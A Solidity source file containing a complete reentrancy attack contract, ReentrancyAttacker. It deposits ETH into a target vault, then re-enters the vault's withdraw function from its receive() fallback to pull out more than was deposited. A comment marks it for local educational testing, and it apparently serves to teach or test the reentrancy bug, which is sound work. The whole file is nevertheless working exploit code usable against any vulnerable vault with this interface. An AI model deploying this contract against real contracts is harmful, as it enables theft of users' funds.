// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Controlled attack contract for local educational testing only.
contract ReentrancyAttacker {
    IVault public targetVault;
    uint256 public attackAmount;
    uint256 public reentries;
    uint256 public maxReentries;
    bool private attacking;

    event AttackStarted(address indexed vault, uint256 initialDeposit);
    event Reentered(uint256 reentryNumber);
    event AttackFinished(uint256 reentriesPerformed);

    function attack(address payable vaultAddress, uint256 maxReentries_) external payable {
        require(msg.value > 0, "Send test ETH");
        require(!attacking, "Attack already in progress");

        targetVault = IVault(vaultAddress);
        attackAmount = msg.value;
        reentries = 0;
        maxReentries = maxReentries_;
        attacking = true;

        emit AttackStarted(vaultAddress, msg.value);

        targetVault.deposit{value: msg.value}();
        targetVault.withdraw();

        attacking = false;
        emit AttackFinished(reentries);
    }

    receive() external payable {
        if (
            attacking &&
            reentries < maxReentries &&
            address(targetVault).balance >= attackAmount
        ) {
            reentries += 1;
            emit Reentered(reentries);
            targetVault.withdraw();
        }
    }
}
